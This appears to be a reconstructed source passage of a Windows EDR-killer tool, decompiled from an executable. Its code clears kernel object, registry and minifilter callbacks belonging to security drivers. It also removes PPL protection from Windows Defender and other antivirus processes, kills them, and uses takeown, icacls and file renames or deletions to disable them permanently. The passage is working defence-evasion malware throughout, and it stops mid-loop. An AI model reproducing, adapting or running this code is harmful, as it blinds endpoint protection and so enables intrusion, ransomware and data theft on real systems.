		DriverWriteMemery((VOID*)(CurFlink + 40), &EDRPreOperation, 8);
		CHAR* DriverName1 = EDRPreOperation ? GetDriverName(EDRPreOperation) : (CHAR*)"0";

		// Read PostOperation callback function pointer
		INT64 EDRPostOperation = 0;
		DriverWriteMemery((VOID*)(CurFlink + 48), &EDRPostOperation, 8);
		CHAR* DriverName2 = EDRPostOperation ? GetDriverName(EDRPostOperation) : (CHAR*)"0";

		// Print/clear Pre
		if (DriverName1) {
			printf("Pre:%s", DriverName1);
			if (IsEDR(DriverName1)) {
				DriverWriteMemery(&Src, (VOID*)(CurFlink + 40), 8);
				printf("[clear], ");
			} else {
				printf(", ");
			}
		}
		// Print/clear Post
		if (DriverName2) {
			printf("Post:%s", DriverName2);
			if (IsEDR(DriverName2)) {
				DriverWriteMemery(&Src, (VOID*)(CurFlink + 48), 8);
				printf("[clear]");
			}
		}
		printf("\n");

		// Walk linked list to next CALLBACK_ENTRY
		INT64 NextFlink = 0;
		DriverWriteMemery((VOID*)CurFlink, &NextFlink, 8);
		CurFlink = NextFlink;
		idx++;
	}
}
VOID ClearObRegisterCallbacks() {

	INT64 PsProcessTypeAddr = GetPsProcessAndProcessTypeAddr(1);
	if (PsProcessTypeAddr == 0) {
		printf("Failed to obtain PsProcessTypeAddr1.\n");
		return;
	}
	INT64 PsThreadTypeAddr = GetPsProcessAndProcessTypeAddr(2);
	if (PsThreadTypeAddr == 0) {
		printf("Failed to obtain PsThreadTypetypeAddr2.\n");
		return;
	}
	printf("----------------------------------------------------\n");
	printf("Drivers that register ObRegisterCallbacks callbacks: \n----------------------------------------------------\n\n");

	RemoveObRegisterCallbacks(PsProcessTypeAddr, 1);
	RemoveObRegisterCallbacks(PsThreadTypeAddr, 2);

	return;
}

VOID ClearCmRegisterCallback() {
	INT64 CmUnRegisterCallbackAddr = GetFuncAddress((CHAR*)"ntoskrnl.exe", (CHAR*)"CmUnRegisterCallback");
	if (CmUnRegisterCallbackAddr == 0) return;
	BYTE* buffer = (BYTE*)calloc(3, 1);
	if (buffer == 0) return;
	INT count = 0;

	while (1) {
		DriverWriteMemery((VOID*)CmUnRegisterCallbackAddr, buffer, 3);

		if (buffer[0] == 0x48 && buffer[1] == 0x8d && buffer[2] == 0x0D) {
			BYTE tmp[3] = { 0 };
			DriverWriteMemery((VOID*)(CmUnRegisterCallbackAddr - 5), tmp, 3);
			if (tmp[0] == 0x48 && tmp[1] == 0x8d && tmp[2] == 0x54) {
				break;
			}
		}
		CmUnRegisterCallbackAddr = CmUnRegisterCallbackAddr + 1;
		if (count == 300) {
			printf("CmUnRegisterCallback address not found.\n");
			return;
		}
		count++;
	}
	printf("----------------------------------------------------\n");
	printf("Register the CmRegisterCallback callback driver: \n----------------------------------------------------\n\n[Clear all below]\n");
	UINT64 PsOffset = 0;

	BYTE tmp[1] = { 0 };
	for (int i = 6, k = 24; i > 2; i--, k = k - 8) {

		DriverWriteMemery((VOID*)(CmUnRegisterCallbackAddr + i), tmp, 1);
		PsOffset = ((UINT64)tmp[0] << k) + PsOffset;
	}
	if ((PsOffset & 0x00000000ff000000) == 0x00000000ff000000)
		PsOffset = PsOffset | 0xffffffff00000000;

	INT64 CallbackListHeadptr = CmUnRegisterCallbackAddr + 7 + PsOffset;
	//printf("%I64x\n", CallbackListHeadptr);

	INT64 CallbackListHeadAddr = 0;
	DriverWriteMemery((VOID*)CallbackListHeadptr, &CallbackListHeadAddr, 8);

	INT64 First = CallbackListHeadAddr;

	do {

		INT64 CallBackFuncAddr = 0;
		DriverWriteMemery((VOID*)(CallbackListHeadAddr + 0x28), &CallBackFuncAddr, 8);
		CHAR* DriverName = GetDriverName(CallBackFuncAddr);
		if (DriverName != NULL) {
			printf("%s\n", DriverName);
		}

		INT64 tmp = 0;
		DriverWriteMemery((VOID*)(CallbackListHeadAddr), &tmp, 8);
		CallbackListHeadAddr = tmp;
	} while (First != CallbackListHeadAddr);

	DriverWriteMemery(&CallbackListHeadptr, (VOID*)CallbackListHeadptr, 8);

}

VOID AddEDRIntance(INT64 IntanceAddr) {
	INT i = 0;
	while (EDRIntance[i] != 0) {
		i++;
	}
	EDRIntance[i] = IntanceAddr;
}

// Execute a command silently via CreateProcess
// Mirrors sub_1400039F0 exactly
VOID ExecProcess(LPCSTR lpCmdLine) {
	SECURITY_ATTRIBUTES sa = {};
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	HANDLE hRead = NULL, hWrite = NULL;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
		printf("Failed to create pipe. Error %d\n", GetLastError());
		return;
	}
	if (!SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0)) {
		// EXE does NOT close handles here on failure
		printf("Failed to set handle information. Error %d\n", GetLastError());
		return;
	}
	STARTUPINFOA si = {};
	si.hStdError = NULL;        // EXE sets hStdError=0 first
	memset(&si, 0, 88);         // then memset(88 bytes)
	si.cb = 104;                // EXE hardcodes 104 (sizeof STARTUPINFOA)
	si.wShowWindow = 0;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 0x101
	si.hStdOutput = hWrite;
	PROCESS_INFORMATION pi = {};
	// EXE: bInheritHandle = FALSE (0), not TRUE
	if (!CreateProcessA(NULL, (LPSTR)lpCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		DWORD err = GetLastError();
		printf("Failed to run: %s. Error %d\n", lpCmdLine, err);
	}
	else {
		CloseHandle(hWrite);
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		// EXE: return CloseHandle(hReadPipe) in success path
		CloseHandle(hRead);
	}
}

// Remove PPL (Protected Process Light) protection from a process
// Mirrors sub_1400032D0 exactly
BOOL RemovePPL(DWORD dwProcessId) {
	// Open with PROCESS_QUERY_LIMITED_INFORMATION (0x1000)
	HANDLE hProc = OpenProcess(0x1000, FALSE, dwProcessId);
	if (!hProc) {
		printf("[RemovePPL] Failed to open %d, error %lu\n", dwProcessId, GetLastError());
		return FALSE;
	}
	// Query SystemExtendedHandleInformation (64) with dynamic buffer growth
	ULONG bufSize = 0x1000;
	ULONG64* buf = (ULONG64*)calloc(bufSize, 1);
	if (!buf) { CloseHandle(hProc); return FALSE; }
	ULONG retLen = 0;
	NTSTATUS st;
	for (st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)64, buf, bufSize, &retLen);
	     st == (NTSTATUS)0xC0000004; // STATUS_INFO_LENGTH_MISMATCH
	     st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)64, buf, bufSize, &retLen)) {
		free(buf);
		bufSize *= 2;
		if (bufSize > 0x20000000) goto LABEL_FAIL;
		buf = (ULONG64*)calloc(bufSize, 1);
		if (!buf) { CloseHandle(hProc); return FALSE; }
	}
	if (NT_SUCCESS(st)) {
		DWORD curPid = GetCurrentProcessId();
		ULONG64 handleCount = buf[0]; // *v8
		if (!handleCount) { free(buf); CloseHandle(hProc); return FALSE; }
		// Each entry = 5 QWORDs (40 bytes):
		//   [0]=Object ptr, [1]=pad/hi, [2]=KernelObject(EPROCESS), [3]=PID, [4]=HandleValue(low16)
		// IDA: v8[5*v11+3]==curPid && v12[4]==(u16)hProc -> found
		// v12[2] = EPROCESS address (v13)
		ULONG idx = 0;
		INT64 eprocess = 0;
		for (ULONG64 v11 = 0; ; ) {
			ULONG64* entry = buf + 1 + v11 * 5; // base=buf[1] (skip count)
			if (entry[3] == curPid && (entry[4] & 0xFFFF) == (ULONG64)(ULONG_PTR)hProc) {
				eprocess = (INT64)entry[2];
				break;
			}
			v11 = ++idx;
			if ((ULONG64)idx >= handleCount) { free(buf); CloseHandle(hProc); return FALSE; }
		}
		free(buf);
		CloseHandle(hProc);
		if (!eprocess) return FALSE;

		// Determine EPROCESS.Protection offset by Build number (dword_14002BC78 = dwBuild)
		INT64 protOffset = 0;
		if (dwBuild > 0x3FAB) { // > 16299
			if (dwBuild == 17134 || dwBuild == 17763 || dwBuild == 18362)
				protOffset = 1738;
			else if (dwBuild == 18363 || dwBuild == 15063 || dwBuild == 16299)
				protOffset = 1738;
			else {
				if ((DWORD)dwBuild < 0x4A61) { // < 19041
					printf("[RemovePPL] The offset address of %d was not found (this Windows version requires adaptation)\n", dwProcessId);
					return FALSE;
				}
				protOffset = 2170;
			}
		}
		else {
			switch (dwBuild) {
			case 16299: protOffset = 1738; break;
			case 9600:  protOffset = 1658; break;
			case 10240: protOffset = 1706; break;
			case 10586: protOffset = 1714; break;
			case 14393: protOffset = 1730; break;
			case 15063: protOffset = 1738; break;
			default:
				printf("[RemovePPL] The offset address of %d was not found (this Windows version requires adaptation)\n", dwProcessId);
				return FALSE;
			}
		}
		// Write zero byte to Protection field (Src=0)
		BYTE zero = 0;
		DriverWriteMemery(&zero, (VOID*)(eprocess + protOffset), 1);
		return TRUE;
	}
LABEL_FAIL:
	printf("[RemovePPL] NtQuerySystemInformation failed to obtain handle,\n");
	if (buf) free(buf);
	CloseHandle(hProc);
	return FALSE;
}

// Recursively rename Defender executables in a directory tree
// EXE sub_140003710: takes _BYTE* (actually wchar_t*), all-wchar_t internally
VOID RenameFilesInDir(LPCSTR dirPath) {
	CHAR searchPath[272] = {};
	memset(searchPath, 0, 0x104);
	size_t v3 = 0;
	while (((BYTE*)dirPath)[v3]) v3++;
	memmove(searchPath, dirPath, v3);
	// find end of searchPath and append \* via WORD write (0x2A5C)
	__int64 v2 = -1LL;
	while (((BYTE*)searchPath)[++v2] != 0);
	*(WORD*)&searchPath[v2] = 0x2A5C; // '\' + '*'

	WIN32_FIND_DATAA fd = {};
	HANDLE hFind = FindFirstFileA(searchPath, &fd);
	if (hFind == INVALID_HANDLE_VALUE) {
		DWORD err = GetLastError();
		if (err != ERROR_PATH_NOT_FOUND)
			printf("Can't open folder: %s,%d\n", searchPath, err);
		return;
	}
	if (FindNextFileA(hFind, &fd)) {
		do {
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				// exe: skip . and .. by checking first two chars
				if (fd.cFileName[0] != '.' ||
					(fd.cFileName[1] && (fd.cFileName[1] != '.' || fd.cFileName[2]))) {
					// EXE: swprintf(Src, 0x104, "%s\\%s", a1, cFileName)
					// a1 is wchar_t*, so %s = wchar_t format
					wchar_t subDir[136] = {};
					swprintf(subDir, 0x104 / sizeof(wchar_t), L"%s\\%S", (wchar_t*)dirPath, fd.cFileName);
					RenameFilesInDir((LPCSTR)subDir); // recursive: EXE passes wchar_t* cast to BYTE*
				}
			}
			else {
				if (stricmp(fd.cFileName, "msmpeng.exe") == 0 ||
					stricmp(fd.cFileName, "nissrv.exe") == 0 ||
					stricmp(fd.cFileName, "mpcmdrun.exe") == 0) {
					// EXE: ExistingFileName[136], NewFileName[136], Src[136], Dst[136]
					wchar_t ExistingFileName[136] = {};
					wchar_t NewFileName[136] = {};
					// EXE fmt: "%s\%s" with wchar_t* dirPath
					swprintf(ExistingFileName, 0x104 / sizeof(wchar_t), L"%s\\%S", (wchar_t*)dirPath, fd.cFileName);
					swprintf(NewFileName, 0x104 / sizeof(wchar_t), L"%s\\%S-RBE", (wchar_t*)dirPath, fd.cFileName);
					wchar_t Dst[136] = {};
					memset(Dst, 0, 0x104);
					// EXE: swprintf(Dst, 0x104, "takeown /F "%s"", ExistingFileName) -- %s = wchar_t
					swprintf(Dst, 0x104 / sizeof(wchar_t), L"takeown /F \"%s\"", ExistingFileName);
					ExecProcess((LPCSTR)Dst);
					wchar_t Src[136] = {};
					memset(Src, 0, 0x104);
					// EXE: icacls format also %s
					swprintf(Src, 0x104 / sizeof(wchar_t), L"icacls \"%s\" /grant Everyone:(F)", ExistingFileName);
					ExecProcess((LPCSTR)Src);
					if (MoveFileA((LPCSTR)ExistingFileName, (LPCSTR)NewFileName)) {
						g_DefenderRenameCount++;
					}
					else {
						DWORD err = GetLastError();
						printf("Rename failed, error %lu: %S\n", err, ExistingFileName);
					}
				}
			}
		} while (FindNextFileA(hFind, &fd));
	}
	FindClose(hFind);
}

// Kill Windows Defender processes and rename its files
// EXE sub_1400034C0: entire body is inside if(dwMajor >= 10), no early return
VOID ClearWindowsDefender() {
	if ((DWORD)dwMajor >= 10) {
		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != INVALID_HANDLE_VALUE) {
			PROCESSENTRY32W pe = {};
			pe.dwSize = 568; // EXE hardcodes 568 (sizeof PROCESSENTRY32W)
			if (Process32FirstW(hSnap, &pe)) {
				do {
					CHAR Dst[272] = {};
					memset(Dst, 0, 0x104);
					wcstombs(Dst, pe.szExeFile, 0x103);
					if (stricmp(Dst, "msmpeng.exe") == 0 ||
						stricmp(Dst, "nissrv.exe") == 0 ||
						stricmp(Dst, "mpcmdrun.exe") == 0) {
						if (!RemovePPL(pe.th32ProcessID))
							printf("%s's PPL Remove Faild.\n", Dst);
						// EXE: OpenProcess(0x1001) = PROCESS_TERMINATE|PROCESS_QUERY_LIMITED_INFORMATION
						HANDLE v2 = OpenProcess(0x1001u, FALSE, pe.th32ProcessID);
						void* v3 = v2;
						if (v2) {
							if (TerminateProcess(v2, 0))
								printf("[Success] Killed %s.\n", Dst);
							else {
								DWORD LastError = GetLastError();
								printf("Failed to terminate %s, error %lu\n", Dst, LastError);
							}
							CloseHandle(v3);
						}
						else {
							DWORD v4 = GetLastError();
							// EXE: wchar_t v8[104], memset(0xC8), swprintf(0xC8, "taskkill /f /im %s", Dst)
							// %s here is NARROW char (Dst is CHAR*)
							wchar_t v8[104] = {};
							memset(v8, 0, 0xC8);
							swprintf(v8, 0xC8 / sizeof(wchar_t), L"taskkill /f /im %S", Dst);
							printf("Failed to open %s, error %lu, Try to use taskkill, please manually check whether the kill is successful!\n", Dst, v4);
							ExecProcess((LPCSTR)v8);
						}
					}
				} while (Process32NextW(hSnap, &pe));
			}
			CloseHandle(hSnap);
		}
		// EXE: RenameFilesInDir calls pass narrow CHAR* which EXE treats as wchar_t*
		RenameFilesInDir("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform");
		RenameFilesInDir("C:\\Program Files (x86)\\Windows Defender");
		RenameFilesInDir("C:\\Program Files\\Windows Defender");
		printf("[INFO] A total of \"%d Defender file\" was renamed, msmpeng.exe, nissrv.exe, and mpcmdrun.exe were all renamed.\n", g_DefenderRenameCount);
	}
}

// Permanently remove AV/EDR: kill processes + rename their executables
// Mirrors sub_140002CE0 exactly
VOID RemoveAVForever() {
	printf("\n----------------------------------------------------\n");
	printf("Remove AV/EDR Forever: \n----------------------------------------------------\n\n");

	// Elevate token privilege (SE_TAKE_OWNERSHIP_PRIVILEGE=20)
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	RtlAdjustPrivilegePtr RtlAdjustPrivilege = (RtlAdjustPrivilegePtr)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	DWORD dwPrevState[3] = {};
	if (((int(__fastcall*)(__int64, __int64, UINT64, DWORD*))RtlAdjustPrivilege)(20LL, 1LL, 0LL, dwPrevState) < 0) {
		printf("PrivilegeUpgrade False!\n");
	}

	// First handle Windows Defender (needs special PPL removal)
	ClearWindowsDefender();

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) return;
	PROCESSENTRY32W pe = {};
	pe.dwSize = sizeof(pe);
	if (Process32FirstW(hSnap, &pe)) {
		do {
			CHAR name[MAX_PATH] = {};
			memset(name, 0, 0x104);
			wcstombs(name, pe.szExeFile, 0x103);

			// EXE: linear search via pointer walk starting at "360qbus.exe" (off_140025490)
			const CHAR* v4 = "360qbus.exe";
			INT64 v5 = 0;
			INT v6 = 0; // isAV flag
			if (v4) {
				while (stricmp(name, v4)) {
					v5 = (UINT)(v5 + 1);
					v4 = AVProcess[v5];
					if (!v4) goto LABEL_8;
				}
				v6 = 1;
			}
			else {
			LABEL_8:
				v6 = 0;
			}
			if (!v6) continue;

			const CHAR* pplStatus = "NOPPL"; // v7

			// PPL check: EXE uses OpenProcess(0x1000)
			HANDLE v8 = OpenProcess(0x1000u, FALSE, pe.th32ProcessID);
			VOID* v9 = v8;
			if (v8) {
				BYTE ProcessInformation[4] = {};
				NTSTATUS InformationProcess = NtQueryInformationProcess(
					v8, (PROCESSINFOCLASS)67, ProcessInformation, 1u, NULL);
				CloseHandle(v9);
				// EXE: !InformationProcess && (ProcessInformation[0] & 7) != 0
				if (!InformationProcess && (ProcessInformation[0] & 7) != 0) {
					pplStatus = "PP/PPL";
					if (dwMajor < 10) {
						printf("[WARN] The Major version < 10 and does not support removal of process PP/PPL.\n");
					}
					else if (!RemovePPL(pe.th32ProcessID)) {
						printf("%s's PPL Remove Faild.\n", name);
					}
				}
			}

			// Get path: EXE opens v11=OpenProcess(0x1000) AFTER PPL check
			// ExeName(CHAR[272]) and NewFileName(wchar_t[136]) on stack
			CHAR ExeName[272] = {};
			wchar_t NewFileName[136] = {};
			INT v14 = 0; // gotPath

			HANDLE v11 = OpenProcess(0x1000u, FALSE, pe.th32ProcessID);
			if (v11) {
				memset(ExeName, 0, 0x104);
				memset(NewFileName, 0, 0x104);
				DWORD dwSz = 260; // dwSize[0]=260
				if (QueryFullProcessImageNameA(v11, 0, ExeName, &dwSz)) {
					// EXE: swprintf(NewFileName, 0x104, "%s-RBE", ExeName)
					// Note: format is %s (narrow), not %S
					swprintf(NewFileName, 0x104 / sizeof(wchar_t), L"%S-RBE", ExeName);
					// EXE: check SecurityHealth* first, sets v14=1
					if (!stricmp(name, "SecurityHealthSystray.exe") ||
						(v14 = 1, !stricmp(name, "SecurityHealthService.exe"))) {
						// EXE: wchar_t v27[136], v29[256]
						wchar_t v27[136] = {};
						memset(v27, 0, 0x104);
						// EXE format: "%s" (ExeName is CHAR*)
						swprintf(v27, 0x104 / sizeof(wchar_t), L"takeown /F \"%S\"", ExeName);
						ExecProcess((LPCSTR)v27);
						wchar_t v29[256] = {};
						memset(v29, 0, 0x104);
						swprintf(v29, 0x104 / sizeof(wchar_t), L"icacls \"%S\" /grant Everyone:(F)", ExeName);
						ExecProcess((LPCSTR)v29);
						v14 = 1; // EXE sets v14=1 again after both cmds
					}
					// Note: if neither Systray nor Service matched, v14 stays 0
				}
				else {
					DWORD LastError = GetLastError();
					printf("Failed to get %s(%s) full path, error %lu\n", name, pplStatus, LastError);
					v14 = 0;
				}
				// EXE: OpenProcess(0x1001) for kill is INSIDE the v11 block
				HANDLE v15 = OpenProcess(0x1001u, FALSE, pe.th32ProcessID);
				VOID* v16 = v15;
				if (v15) {
					if (TerminateProcess(v15, 0)) {
						printf("[Success] Killed %s(%s).\n", name, pplStatus);
						CloseHandle(v16);
						if (v14) {
							// EXE: strlen(ExeName) via do-while, stores in v18
							INT64 v18 = -1LL;
							do { ++v18; } while (ExeName[v18]);
							// EXE: checks Dst[v18+271]=='e'(101) && Dst[v18+270]=='x'(120) && Dst[v18+269]=='e'(101)
							// Dst is 'name' (CHAR[MAX_PATH=260]), so Dst+256 == name+256
							// Dst[(unsigned)v18+271] = name[(unsigned)v18+271] but name is only 260 bytes
							// In EXE: Dst is at [rsp+280h], ExeName at [rsp+390h] — they are different stack vars
							// Dst[v18+271] means Dst + strlen(ExeName) + 271
							// This is actually checking ExeName[-1], ExeName[-2], ExeName[-3] relative to Dst
							// Since ExeName is at Dst+272, ExeName[-1]=Dst[271], ExeName[-2]=Dst[270], ExeName[-3]=Dst[269]
							// So: check ExeName[v18-1]=='e', ExeName[v18-2]=='x', ExeName[v18-3]=='e'
							// i.e. the last 3 chars of ExeName are 'e','x','e' (.exe ending)
							if (ExeName[v18-1] == 'e' && ExeName[v18-2] == 'x' && ExeName[v18-3] == 'e') {
								if (MoveFileA(ExeName, (LPCSTR)NewFileName)) {
									printf("Renamed to %s\n", (const char*)NewFileName);
								}
								else {
									DWORD v19 = GetLastError();
									printf("Rename failed, error %lu\n", v19);
								}
							}
						}
					}
					else {
						DWORD v20 = GetLastError();
						printf("Failed to terminate %s(%s), error %lu\n", name, pplStatus, v20);
						// EXE: does NOT CloseHandle(v16) here — falls through
					}
				}
				else {
					DWORD v17 = GetLastError();
					printf("Failed to open %s, error %lu, Try to use taskkill, please manually check whether the kill/rename is successful!\n",
						name, v17);
					// EXE: wchar_t v27[136], memset(0xC8), swprintf(0xC8, "taskkill /f /im %s", Dst)
					wchar_t v27b[136] = {};
					memset(v27b, 0, 0xC8);
					swprintf(v27b, 0xC8 / sizeof(wchar_t), L"taskkill /f /im %S", name);
					ExecProcess((LPCSTR)v27b);
					// EXE: wchar_t v29[256], memset(sizeof v29), swprintf(0x200, "move /Y "%s" "%s"", ExeName, NewFileName)
					wchar_t v29b[256] = {};
					memset(v29b, 0, sizeof(v29b));
					swprintf(v29b, 0x200 / sizeof(wchar_t), L"move /Y \"%S\" \"%s\"", ExeName, NewFileName);
					ExecProcess((LPCSTR)v29b);
				}
			}
			else {
				DWORD v12 = GetLastError();
				printf("Failed to open %s with LIMITED_QUERY, error %lu,Please perform manual kill AV and rename AV files!\n",
					name, v12);
			}
		} while (Process32NextW(hSnap, &pe));
	}
	CloseHandle(hSnap);

	// Delete 360sdrun.exe specifically (it self-restarts, needs deletion)
	if (GetFileAttributesA("C:\\Program Files\\360\\360sd\\360sdrun.exe") != INVALID_FILE_ATTRIBUTES) {
		if (DeleteFileA("C:\\Program Files\\360\\360sd\\360sdrun.exe"))
			printf("[Success] File 360sdrun.exe deleted successfully.\n");
	}
	if (GetFileAttributesA("C:\\Program Files (x86)\\360\\360SD\\360sdrun.exe") != INVALID_FILE_ATTRIBUTES) {
		if (DeleteFileA("C:\\Program Files (x86)\\360\\360SD\\360sdrun.exe"))
			printf("[Success] File 360sdrun.exe deleted successfully.\n");
	}
}
CHAR* ReadDriverName(INT64 FLT_FILTERAddr) {
	
	INT Offset = 0;
	if (dwMajor == 10) {
		Offset = 0x38;
	}
	else if (dwMajor == 6) {
		Offset = 0x28;
	}
	else {
		printf("Windows system version not supported yet.");
		exit(0);
	}
	USHORT FilerNameLen = 0;
	DriverWriteMemery((VOID*)(FLT_FILTERAddr + Offset + 2), &FilerNameLen, 2);
	if (FilerNameLen == 0) return NULL;

	INT64 FilterNameAddr = 0;
	DriverWriteMemery((VOID*)(FLT_FILTERAddr + Offset + 8), &FilterNameAddr, 8);

	TCHAR* FilterName = (TCHAR*)calloc(FilerNameLen+50, 1);
	if (FilterName == NULL) return NULL;
	DriverWriteMemery((VOID*)FilterNameAddr, FilterName, FilerNameLen);

	CHAR* FilterNameA = (CHAR*)calloc(FilerNameLen + 10, 1);
	if (FilterNameA == 0) return NULL;
	wcstombs(FilterNameA, FilterName, FilerNameLen);

	lstrcatA(FilterNameA, ".sys");
	return FilterNameA;
}
BOOL IsEDRIntance(INT j, INT64 Flink) {
	Flink += 0x10;
	INT64 InstanceAddr = 0;
	DriverWriteMemery((VOID*)Flink, &InstanceAddr, 8);

	INT k = 0;
	BOOL Flag = 0;
	while (EDRIntance[k] != 0) {
		if (EDRIntance[k] == InstanceAddr) Flag = 1;
		k++;
	}
	if (!Flag) return Flag;

	if (dwMajor == 10) {
		InstanceAddr += 0x40;
	}
	else if (dwMajor == 6) {
		InstanceAddr += 0x30;
	}
	else {
		printf("Windows system version not supported yet.");
		exit(0);
	}
	
	INT64 FilterAddr = 0;
	DriverWriteMemery((VOID*)InstanceAddr, &FilterAddr, 8);

	CHAR* FilterName = ReadDriverName(FilterAddr);
	if (FilterName == NULL) return 0;
	printf("\t\t[%d] %s : %I64x [Clear]\n", j, FilterName, Flink - 0x10);//_CALLBACK_NODE

	return Flag;
}
VOID RemoverInstanceCallback(INT64 FLT_FILTERAddr) {
	INT64 FilterInstanceAddr = 0;

	if (dwMajor == 10) {
		DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0xD0), &FilterInstanceAddr, 8); //0x68 + 0x68
	}
	else if (dwMajor == 6) {
		DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0xC0), &FilterInstanceAddr, 8); //0x58+0x68
	}
	else {
		printf("Windows system version not supported yet.");
		exit(0);
	}

	INT64 FirstLink = FilterInstanceAddr;
	INT64 data = 0;

	INT count = 0;
	do {
		count++;
		INT64 tmpAddr = 0;
		DriverWriteMemery((VOID*)(FilterInstanceAddr), &tmpAddr, 8);
		FilterInstanceAddr = tmpAddr;
	} while (FirstLink != FilterInstanceAddr);
	count--;
	INT i = 0;
	do {
		INT Offset = 0;
		if (dwMajor == 10) {
			Offset = 0x70;
		}
		else if (dwMajor == 6) {
			Offset = 0x60;
		}
		else {
			printf("Windows system version not supported yet.");
			exit(0);
		}
		FilterInstanceAddr -= Offset;
		printf("\t\tFLT_INSTANCE 0x%I64x\n", FilterInstanceAddr);
		AddEDRIntance(FilterInstanceAddr);

		for (INT i = 0; i < 50; i++) {
			INT64 CallbackNodeData = 0;
			INT offset = 0;
			if (dwMajor == 10 && dwBuild < 22000) offset = 0xa0;
			else if (dwMajor == 10 && dwBuild >= 22000) offset = 0xa8;
			else if (dwMajor == 6) offset = 0x90;
			else {
				printf("Windows system version not supported yet.");
				exit(0);
			}
			DriverWriteMemery((VOID*)(FilterInstanceAddr + offset + i * 8), &CallbackNodeData, 8);
			if (CallbackNodeData != 0) {
				printf("\t\t\t[%d] : 0x%I64x\t[Clear]\n", i, CallbackNodeData);
				DriverWriteMemery(&data, (VOID*)(FilterInstanceAddr + offset + i * 8), 8);
			}
		}

		INT64 tmpAddr = 0;
		DriverWriteMemery((VOID*)(FilterInstanceAddr + Offset), &tmpAddr, 8);
		FilterInstanceAddr = tmpAddr;
		i++;
	} while (i < count);
}
VOID ClearMiniFilterCallback() {
	printf("\n\n----------------------------------------------------\n");
	printf("Register MiniFilter Callback driver: \n----------------------------------------------------\n\n");
	INT64 FltEnumerateFiltersAddr = GetFuncAddress((CHAR*)"FLTMGR.sys", (CHAR*)"FltEnumerateFilters");
	if (FltEnumerateFiltersAddr == 0) {
		printf("FltEnumerateFilters function address not found.\n");
		return;
	}
	BYTE* buffer = (BYTE*)calloc(3, 1);
	if (buffer == 0) return;
	INT count = 0;


	while (1) {
		DriverWriteMemery((VOID*)FltEnumerateFiltersAddr, buffer, 3);

		if (buffer[0] == 0x48 && buffer[1] == 0x8d && buffer[2] == 0x05) {
			break;
		}
		FltEnumerateFiltersAddr = FltEnumerateFiltersAddr + 1;
		if (count == 300) {
			printf("FltGlobals structure address not found.\n");
			return;
		}
		count++;
	}

	UINT64 PsOffset = 0;

	BYTE tmp[1] = { 0 };
	for (int i = 6, k = 24; i > 2; i--, k = k - 8) {

		DriverWriteMemery((VOID*)(FltEnumerateFiltersAddr + i), tmp, 1);
		PsOffset = ((UINT64)tmp[0] << k) + PsOffset;
	}
	if ((PsOffset & 0x00000000ff000000) == 0x00000000ff000000)
		PsOffset = PsOffset | 0xffffffff00000000;
	INT64 FrameAddrPTR = FltEnumerateFiltersAddr + 7 + PsOffset;

	INT64 FLT_FRAMEAddr = 0;
	DriverWriteMemery((VOID*)FrameAddrPTR, &FLT_FRAMEAddr, 8);
	FLT_FRAMEAddr -= 0x8;
	printf("FLT_FRAME: 0x%I64x\n", FLT_FRAMEAddr);

	INT64 FLT_FILTERAddr = 0;
	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0xB0), &FLT_FILTERAddr, 8);

	INT64 FilterFirstLink = FLT_FILTERAddr;

	ULONG FilterCount = 0;
	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0xC0), &FilterCount, 4);

	INT i = 0;
	do {

		FLT_FILTERAddr -= 0x10;

		CHAR* FilterName = ReadDriverName(FLT_FILTERAddr);
		if (FilterName == NULL)break;
		printf("\tFLT_FILTER %s: 0x%I64x\n", FilterName, FLT_FILTERAddr);
		
		if (IsEDR(FilterName)) {
			RemoverInstanceCallback(FLT_FILTERAddr);
		}
		INT64 tmpaddr = 0;
		DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0x10), &tmpaddr, 8);
		FLT_FILTERAddr = tmpaddr;
		i++;
	} while (i < FilterCount);

	INT64 FLT_VOLUMESAddr = 0;
	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0x130), &FLT_VOLUMESAddr, 8);

	ULONG FLT_VOLUMESCount = 0;
	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0x140), &FLT_VOLUMESCount, 4);


	i = 0;
	do {
		FLT_VOLUMESAddr -= 0x10;

		printf("\tFLT_VOLUMES [%d]: %I64x\n", i, FLT_VOLUMESAddr);
		INT64 VolumesCallback = 0;
		if (dwMajor == 10 && dwBuild < 22621) { 
			VolumesCallback = FLT_VOLUMESAddr + 0x120;
		}
		else if (dwMajor == 10 && dwBuild >= 22621) {
			VolumesCallback = FLT_VOLUMESAddr + 0x130;
		}
		else if (dwMajor == 6) {
			VolumesCallback = FLT_VOLUMESAddr + 0x110;
		}
		else {
			printf("Windows system version not supported yet.");
			return;
		}
		
		for (INT j = 0; j < 50; j++) {

			INT64 FlinkAddr = VolumesCallback + (j * 16);
			INT64 Flink = 0;
			INT64 Blink = 0;
			DriverWriteMemery((VOID*)FlinkAddr, &Flink, 8);
			DriverWriteMemery((VOID*)(FlinkAddr + 8), &Blink, 8);

			INT64 First = Flink;
			INT count = 0;
			do {
				count++;
				INT64 NextFlink = 0;
				DriverWriteMemery((VOID*)First, &NextFlink, 8);
				First = NextFlink;
			} while (FlinkAddr != First);
			//printf("count: %d\n", count);

			INT k = 0;
			INT64 CurLocate = Flink;
			do {
				INT64 NextFlink = 0;
				DriverWriteMemery((VOID*)CurLocate, &NextFlink, 8);
				//printf("curlocate1: %I64x\n", CurLocate);
				//system("pause");
